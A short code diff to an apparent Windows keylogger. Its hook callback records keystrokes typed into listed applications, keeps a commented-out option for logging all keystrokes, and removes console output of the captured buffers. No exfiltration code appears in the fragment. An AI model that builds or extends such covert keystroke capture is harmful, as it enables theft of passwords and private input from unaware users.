@@ -293,7 +293,7 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 				key = formatKey(MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout));
 			}
-			//kbBuffer += key;
+			//kbBuffer += key;  // Uncomment only when want to log all keystrokes
 
 			if (std::find(monitoredWindows.begin(), monitoredWindows.end(), lpBaseName) != monitoredWindows.end()) {
 				kbBufferFiltered += key;
@@ -310,9 +310,6 @@ LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 				}
 			}
 		}
-
-		std::wcout << L"kbBuffer: " << kbBuffer << std::endl;
-		std::wcout << L"kbBufferFiltered: " << kbBufferFiltered << std::endl;
 
 		MyOutputDebugStringW(L"[vkcode] %d\n", vkCode);
 		DWORD now = kbdStruct.time;
